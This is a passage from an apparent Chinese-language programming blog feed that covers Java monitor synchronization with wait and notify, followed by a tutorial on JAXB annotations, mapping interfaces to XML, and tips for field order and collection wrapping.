data-src="semaphore.jpg"></p><p>如果一个线性获得了某些数据上的一个锁(lock)，那么，直到该线程释放该锁之前，其他的线程都无法获取该锁。如果我们在进行多线程编程时，每次都需要获取信号、操作信号、释放信号等操作，那么多线程的编程体验将是非常不愉快的。幸运的是，我们并不需要这么做，JVM在底层帮我们把这些繁琐的细节做完了。</p><p>为了声明一个监控区域，该监控区域最多只允许一个客户(线程)访问，Java提供了 同步语句(synchronization statements) 和 同步方法(synchronization methods) 两种便利机制。一旦某个代码块被 synchronized 关键词包围，该代码块就变成了一个监控区域。同时，该监控区域对应的二元信号，由JVM在底层自动生成并维护着。</p><h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><p>我们知道，每一个对象(Object)或者类(Class)都有一个关联的监视器。换言之，我们可以直接说，每一个对象都有一个一个监视器，因为类(Class)在广义上也是一个JVM中的对象。因为每个对象都有它私自的空间，而且可以监控它的客户(线程)序列。</p><p>为了不同的线程之间可以互相协作，Java提供了 wait() 、notify() 等方法来 挂起一个线程、唤醒另一个等待在特定监视器上的线程。此外，Java还提供了另外三个版本的方法：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">wait(<span class="keyword">long</span> timeout, <span class="keyword">int</span> nanos)</span><br><span class="line">wait(<span class="keyword">long</span> timeout) notified by other threads or notified by timeout.</span><br><span class="line">notify(all)</span><br></pre></td></tr></table></figure><p>注意：这些线程之间的协作方法，只可以在同步方法 (synchronized methods) 或者 同步声明(synchronized statements) 中被调用。原因很简单，如果一个客户(线程)不需要信号的互斥，那么就没有必须让该客户与其他客户进行监视或者合作，该客户可以直接随意的访问该方法。</p><p>个人的理解：同步(synchronized)控制的是线程是否有权限访问，wait()/notify()控制的是线程之间的访问顺序，所以必须先有同步(权限)控制，在内部再进行顺序控制。</p><p><a href="http://www.tiantianbianma.com/java-monitor-synchronization.html/">原文链接</a></p>]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Synchronization</tag>
        <tag>线程</tag>
      </tags>
  </entry>
  <entry>
    <title>使用jaxb接口的实现和一些Tips</title>
    <url>/2016/02/27/jaxb-use-interface-and-some-tips/</url>
    <content><![CDATA[<p>JAXB（Java API for XML Binding），提供了一个快速便捷的方式将Java对象与XML进行转换。在JAX-WS（Java的WebService规范之一）中，JDK1.6 自带的版本JAX-WS2.1，其底层支持就是JAXB。JAXB 2.0是JDK 1.6的组成部分。JAXB 2.2.3是JDK 1.7的组成部分。</p><pre><code>JAXB 可以实现Java对象与XML的相互转换，在JAXB中，将一个Java对象转换为XML的过程称之为Marshal，将XML转换为Java对象的过程称之为UnMarshal。</code></pre><h2 id="JAXB中的一些注解"><a href="#JAXB中的一些注解" class="headerlink" title="JAXB中的一些注解"></a>JAXB中的一些注解</h2><p>JDK中JAXB相关的重要Class和Interface：</p><p>1、JAXBContext类，是应用的入口，用于管理XML/Java绑定信息。</p><p>2、Marshaller接口，将Java对象序列化为XML数据。</p><p>3、Unmarshaller接口，将XML数据反序列化为Java对象。</p><p>JDK中JAXB相关的重要Annotation：</p><p>1、@XmlType，将Java类或枚举类型映射到XML模式类型。用在class类的注解，常与@XmlRootElement，@XmlAccessorType一起使用。</p><p>2、@XmlAccessorType(XmlAccessType.FIELD) ，控制字段或属性的序列化。FIELD表示JAXB将自动绑定Java类中的每个非静态的（static）、非瞬态的（由@XmlTransient标注）字段到XML。其他值还有XmlAccessType.PROPERTY和XmlAccessType.NONE。</p><p>3、@XmlAccessorOrder，控制JAXB 绑定类中属性和字段的排序。</p><pre><code>AccessorOrder.ALPHABETICAL：对生成的xml元素按字母书序排序</code></pre><p>　　XmlAccessOrder.UNDEFINED:不排序</p><pre><code>当同时使用@XmlType的propOrder属性指定顺序时，以指定为准</code></pre><p>4、@XmlJavaTypeAdapter，使用定制的适配器（即扩展抽象类XmlAdapter并覆盖marshal()和unmarshal()方法），以序列化Java类为XML。</p><p>5、@XmlElementWrapper ，对于数组或集合（即包含多个元素的成员变量），生成一个包装该数组或集合的XML元素（称为包装器）。</p><p>6、@XmlRootElement，将Java类或枚举类型映射到XML元素。</p><p>7、@XmlElement，将Java类的一个属性映射到与属性同名的一个XML元素。</p><p>8、@XmlAttribute，将Java类的一个属性映射到与属性同名的一个XML属性。</p><h2 id="Mapping-interfaces"><a href="#Mapping-interfaces" class="headerlink" title="Mapping interfaces"></a>Mapping interfaces</h2><p>因为W3C XML Schema和Java类型系统引起的XML类型系统之间的差异，JAXB不能绑定接口开箱即用，但也有一些事情可以做。</p><h3 id="使用-XmlRootElement"><a href="#使用-XmlRootElement" class="headerlink" title="使用@XmlRootElement"></a>使用@XmlRootElement</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlRootElement</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Zoo</span> </span>&#123;</span><br><span class="line">  <span class="meta">@XmlAnyElement</span></span><br><span class="line">  <span class="keyword">public</span> List&lt;Animal&gt; animals;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Animal</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">sleep</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@XmlRootElement</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> <span class="keyword">implements</span> <span class="title">Animal</span> </span>&#123; ... &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@XmlRootElement</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span> <span class="keyword">implements</span> <span class="title">Animal</span> </span>&#123; ... &#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">zoo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lion</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">lion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dog</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">dog</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">zoo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种方法的主要特点是：</p><ol><li>实现是开放式的; 任何人都可以实现这些接口，即使由不同的人从不同的模块，只要它们都被提供给JAXBContext.newInstance方法。没有必要列出的任何地方都实现类。</li><li>每个接口的实现都需要有一个独特的元素名称。</li><li>为每个接口参考需要有 XmlElementRef将 注释。该类型= Object.class部分告诉JAXB所有实现最大的公共基类是java.lang.Object继承。</li></ol><p>分组，列表</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlRootElement</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Zoo</span> </span>&#123;</span><br><span class="line">  <span class="meta">@XmlElementWrapper</span></span><br><span class="line">  <span class="meta">@XmlAnyElement</span></span><br><span class="line">  <span class="keyword">public</span> List&lt;Animal&gt; onExhibit;</span><br><span class="line">  <span class="meta">@XmlElementWrapper</span></span><br><span class="line">  <span class="meta">@XmlAnyElement</span></span><br><span class="line">  <span class="keyword">public</span> List&lt;Animal&gt; resting;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">zoo</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">onExhibit</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">lion</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">lion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dog</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">dog</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">onExhibit</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resting</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">lion</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">lion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dog</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">dog</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resting</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">zoo</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="使用-XmlJavaTypeAdapter"><a href="#使用-XmlJavaTypeAdapter" class="headerlink" title="使用@XmlJavaTypeAdapter"></a>使用@XmlJavaTypeAdapter</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlJavaTypeAdapter</span>(FooImpl.Adapter<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">interface</span> <span class="title">IFoo</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooImpl</span> <span class="keyword">implements</span> <span class="title">IFoo</span> </span>&#123;</span><br><span class="line">  <span class="meta">@XmlAttribute</span></span><br><span class="line">  <span class="keyword">private</span> String name;</span><br><span class="line">  <span class="meta">@XmlElement</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> x;</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">XmlAdapter</span>&lt;<span class="title">FooImpl</span>,<span class="title">IFoo</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">IFoo <span class="title">unmarshal</span><span class="params">(FooImpl v)</span> </span>&#123; <span class="keyword">return</span> v; &#125;</span><br><span class="line">    <span class="function">FooImpl <span class="title">marshal</span><span class="params">(IFoo v)</span> </span>&#123; <span class="keyword">return</span> (FooImpl)v; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Somewhere</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> IFoo lhs;</span><br><span class="line">  <span class="keyword">public</span> IFoo rhs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">somewhere</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lhs</span> <span class="attr">name</span>=<span class="string">"..."</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">x</span>&gt;</span>5<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">lhs</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rhs</span> <span class="attr">name</span>=<span class="string">"..."</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">x</span>&gt;</span>5<span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">rhs</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">somewhere</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这种方法的主要特点是：</p><ol><li>接口和实现将通过一个适配器紧密结合，虽然改变适配器代码将允许您支持多种实现。</li><li>有在使用接口，无需任何注释。<br>这种技术的一个变化是，当你有几个实现接口，不只是一个。</li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlJavaTypeAdapter</span>(AbstractFooImpl.Adapter<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">interface</span> <span class="title">IFoo</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractFooImpl</span> <span class="keyword">implements</span> <span class="title">IFoo</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Adapter</span> <span class="keyword">extends</span> <span class="title">XmlAdapter</span>&lt;<span class="title">AbstractFooImpl</span>,<span class="title">IFoo</span>&gt; </span>&#123;</span><br><span class="line">    <span class="function">IFoo <span class="title">unmarshal</span><span class="params">(AbstractFooImpl v)</span> </span>&#123; <span class="keyword">return</span> v; &#125;</span><br><span class="line">    <span class="function">AbstractFooImpl <span class="title">marshal</span><span class="params">(IFoo v)</span> </span>&#123; <span class="keyword">return</span> (AbstractFooImpl)v; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SomeFooImpl</span> <span class="keyword">extends</span> <span class="title">AbstractFooImpl</span> </span>&#123;</span><br><span class="line">  <span class="meta">@XmlAttribute</span> String name;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnotherFooImpl</span> <span class="keyword">extends</span> <span class="title">AbstractFooImpl</span> </span>&#123;</span><br><span class="line">  <span class="meta">@XmlAttribute</span> <span class="keyword">int</span> id;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Somewhere</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> IFoo lhs;</span><br><span class="line">  <span class="keyword">public</span> IFoo rhs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">somewhere</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lhs</span> <span class="attr">xsi:type</span>=<span class="string">"someFooImpl"</span> <span class="attr">name</span>=<span class="string">"..."</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">lhs</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">rhs</span> <span class="attr">xsi:type</span>=<span class="string">"anotherFooImpl"</span> <span class="attr">id</span>=<span class="string">"3"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">somewhere</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要注意的是SomeFooImpl和AnotherFooImpl必须提交JAXBContext.newInstance一种方式或其他。</p><p>再举这个例子，你可以使用Object而不是AbstractFooImpl。如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlJavaTypeAdapter</span>(AnyTypeAdapter<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">interface</span> <span class="title">IFoo</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AnyTypeAdapter</span> <span class="keyword">extends</span> <span class="title">XmlAdapter</span>&lt;<span class="title">Object</span>,<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line">  <span class="function">Object <span class="title">unmarshal</span><span class="params">(Object v)</span> </span>&#123; <span class="keyword">return</span> v; &#125;</span><br><span class="line">  <span class="function">Object <span class="title">marshal</span><span class="params">(Object v)</span> </span>&#123; <span class="keyword">return</span> v; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SomeFooImpl</span> <span class="keyword">implements</span> <span class="title">IFoo</span> </span>&#123;</span><br><span class="line">  <span class="meta">@XmlAttribute</span> String name;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Somewhere</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> IFoo lhs;</span><br><span class="line">  <span class="keyword">public</span> IFoo rhs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">xs:complexType</span> <span class="attr">name</span>=<span class="string">"somewhere"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"lhs"</span> <span class="attr">type</span>=<span class="string">"xs:anyType"</span> <span class="attr">minOccurs</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"rhs"</span> <span class="attr">type</span>=<span class="string">"xs:anyType"</span> <span class="attr">minOccurs</span>=<span class="string">"0"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xs:complexType</span>&gt;</span></span><br></pre></td></tr></table></figure><p>正如你所看到的，模式将产生接受的xs：anyType的它比Java代码实际上需要更多的宽松。实例将是与上述相同的例子。从JAXB 2.1 RI开始，我们捆绑com.sun.xml.bind.AnyTypeAdapter在定义该适配器的运行时类。所以，你将不必编写此适配器在你的代码。</p><h3 id="使用-XmlElement"><a href="#使用-XmlElement" class="headerlink" title="使用@XmlElement"></a>使用@XmlElement</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IFoo</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FooImpl</span> <span class="keyword">implements</span> <span class="title">IFoo</span> </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Somewhere</span> </span>&#123;</span><br><span class="line">  <span class="meta">@XmlElement</span>(type=FooImpl<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">  <span class="title">public</span> <span class="title">IFoo</span> <span class="title">lhs</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">somewhere</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">lhs</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">lhs</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">somewhere</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这实际上告诉JAXB运行时说：“即使字段是IFoo的，它实际上只是FooImpl。</p><p>在这种方法中，一个接口的引用必须具有实际实现类的知识。因此，尽管这需要输入最少的，它可能不会，如果这跨越模块的边界工作得很好。</p><p>像 XmlJavaTypeAdapter 方法，这可以甚至当存在多个实施方式中，只要它们共享共同的祖先中。</p><p>这种情况下的极端是指定@XmlElement（类型= Object.class） 。</p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h3 id="指定XML字段顺序"><a href="#指定XML字段顺序" class="headerlink" title="指定XML字段顺序"></a>指定XML字段顺序</h3><p>默认JAXB生成的XML字段是随机的，可以使用注解<code>@XmlType</code>的<code>propOrder</code>属性来指定XML字段的顺序。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlType</span>(propOrder = &#123; <span class="string">"user"</span>, <span class="string">"profile"</span>,<span class="string">"unit"</span>&#125;)</span><br></pre></td></tr></table></figure><p>另外，使用<code>@XmlElementWrapper</code>标注的属性，不能出现在<code>@XmlType</code>的<code>propOrder</code>列表中。但是对于使用<code>@XmlElement</code>标注的属性，则必须出现在该列表中</p><h3 id="集合中省略集合节点名"><a href="#集合中省略集合节点名" class="headerlink" title="集合中省略集合节点名"></a>集合中省略集合节点名</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">//Example: code fragment</span><br><span class="line">  int[] names;</span><br><span class="line"></span><br><span class="line">// XML Serialization Form 1 (Unwrapped collection)</span><br><span class="line"><span class="tag">&lt;<span class="name">names</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">names</span>&gt;</span> ... <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">// XML Serialization Form 2 ( Wrapped collection )</span><br><span class="line"><span class="tag">&lt;<span class="name">wrapperElement</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">names</span>&gt;</span> value-of-item <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">names</span>&gt;</span> value-of-item <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">   ....</span><br><span class="line"><span class="tag">&lt;/<span class="name">wrapperElement</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The <a href="http://docs.oracle.com/javaee/5/api/javax/xml/bind/annotation/XmlElementWrapper.html">docs</a> state the the @XmlElementWrapper annotation can be used for ‘unwrapped’ or ‘wrapped’ collections.</p><p>If you include @XmlElementWrapper it will add a grouping element:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlElementWrapper</span></span><br><span class="line"><span class="meta">@XmlElement</span>(name=<span class="string">"foo"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Foo&gt; <span class="title">getFoos</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> foos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foos</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">foo</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">foo</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">foos</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>and if you omit it, then it won’t.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlElement</span>(name=<span class="string">"foo"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Foo&gt; <span class="title">getFoos</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> foos;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foo</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">foo</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure><p>另外，<code>@XmlElementWrapper</code>仅允许出现在集合属性上。</p><p><a href="http://stackoverflow.com/questions/16202583/xmlelementwrapper-for-unwrapped-collections">stackoverflow地址</a></p><h3 id="转为XML文件时移除xmlns-xsi和xsi-type"><a href="#转为XML文件时移除xmlns-xsi和xsi-type" class="headerlink" title="转为XML文件时移除xmlns:xsi和xsi:type"></a>转为XML文件时移除xmlns:xsi和xsi:type</h3><p>How to remove xmlns:xsi and xsi:type from JAXB marshalled XML file</p><p>使用<code>@XmlElement</code>指定<code>Type</code>类型</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlElement</span>(name = <span class="string">"DefaultCar"</span>, type=String<span class="class">.<span class="keyword">class</span>) </span></span><br><span class="line"><span class="class"><span class="title">protected</span> <span class="title">Object</span> <span class="title">defaultcar</span></span>;  </span><br><span class="line"></span><br><span class="line"><span class="meta">@XmlElement</span>(name = <span class="string">"dir"</span>, type=Dir<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class"><span class="title">private</span> <span class="title">ArrayList</span> <span class="title">dirs</span> </span>= <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>在List中如果每个对象，类型不同，对象转XML时，可以用</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlElementRefs</span>(&#123;</span><br><span class="line">        <span class="meta">@XmlElementRef</span>(name=<span class="string">"data"</span>, type=A<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">        @<span class="title">XmlElementRef</span>(<span class="title">name</span></span>=<span class="string">"data"</span>, type=B<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">        @<span class="title">XmlElementRef</span>(<span class="title">name</span></span>=<span class="string">"data"</span>, type=C<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">        @<span class="title">XmlElementRef</span>(<span class="title">name</span></span>=<span class="string">"data"</span>, type=D<span class="class">.<span class="keyword">class</span>)&#125;)</span></span><br></pre></td></tr></table></figure><p>但是在XML转换为对象时，这边可能需要额外判断一下，直接转换时，如果XML节点元素都为<data xsi:type>，指定了type，也可能会报错。</data></p><h3 id="XmlElementRef的一些使用"><a href="#XmlElementRef的一些使用" class="headerlink" title="XmlElementRef的一些使用"></a>XmlElementRef的一些使用</h3><p>@XmlElementRef annotation can be used with a JavaBean property or from within @XmlElementRefs</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlElementRefs</span>(&#123;</span><br><span class="line">    <span class="meta">@XmlElementRef</span>(name=<span class="string">"data"</span>, type=A<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">    @<span class="title">XmlElementRef</span>(<span class="title">name</span></span>=<span class="string">"data"</span>, type=B<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">    @<span class="title">XmlElementRef</span>(<span class="title">name</span></span>=<span class="string">"data"</span>, type=C<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">    @<span class="title">XmlElementRef</span>(<span class="title">name</span></span>=<span class="string">"data"</span>, type=D<span class="class">.<span class="keyword">class</span>)&#125;)</span></span><br></pre></td></tr></table></figure><p>XML Schema substitution group support</p><p>The usage is subject to the following constraints:</p><ol><li>If the collection item type (for collection property) or property type (for single valued property) is JAXBElement, then @XmlElementRef}.name() and @XmlElementRef.namespace() must point an element factory method with an @XmlElementDecl annotation in a class annotated with @XmlRegistry (usually ObjectFactory class generated by the schema compiler) :<br>(1). @XmlElementDecl.name() must equal @XmlElementRef.name()<br>(2). @XmlElementDecl.namespace() must equal @XmlElementRef.namespace().</li><li>If the collection item type (for collection property) or property type (for single valued property) is not JAXBElement, then the type referenced by the property or field must be annotated with XmlRootElement.</li><li>This annotation can be used with the following annotations: XmlElementWrapper, XmlJavaTypeAdapter.</li></ol><h4 id="Example-1-Ant-Task-Example"><a href="#Example-1-Ant-Task-Example" class="headerlink" title="Example 1: Ant Task Example"></a>Example 1: Ant Task Example</h4><p>The following Java class hierarchy models an Ant build script. An Ant task corresponds to a class in the class hierarchy. The XML element name of an Ant task is indicated by the <code>@XmlRootElement</code> annotation on its corresponding class.</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@XmlRootElement</span>(name=<span class="string">"target"</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Target</span> </span>&#123;</span><br><span class="line">    <span class="comment">// The presence of @XmlElementRef indicates that the XML</span></span><br><span class="line">    <span class="comment">// element name will be derived from the @XmlRootElement </span></span><br><span class="line">    <span class="comment">// annotation on the type (for e.g. "jar" for JarTask). </span></span><br><span class="line">    <span class="meta">@XmlElementRef</span></span><br><span class="line">    List&lt;Task&gt; tasks;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Task</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@XmlRootElement</span>(name=<span class="string">"jar"</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JarTask</span> <span class="keyword">extends</span> <span class="title">Task</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@XmlRootElement</span>(name=<span class="string">"javac"</span>)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JavacTask</span> <span class="keyword">extends</span> <span class="title">Task</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- XML Schema fragment --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">name</span>=<span class="string">"target"</span> <span class="attr">type</span>=<span class="string">"Target"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xs:complexType</span> <span class="attr">name</span>=<span class="string">"Target"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xs:choice</span> <span class="attr">maxOccurs</span>=<span class="string">"unbounded"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">ref</span>=<span class="string">"jar"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">xs:element</span> <span class="attr">ref</span>=<span class="string">"javac"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">xs:choice</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xs:sequence</span>&gt;</span></span><br><span class="line"><span 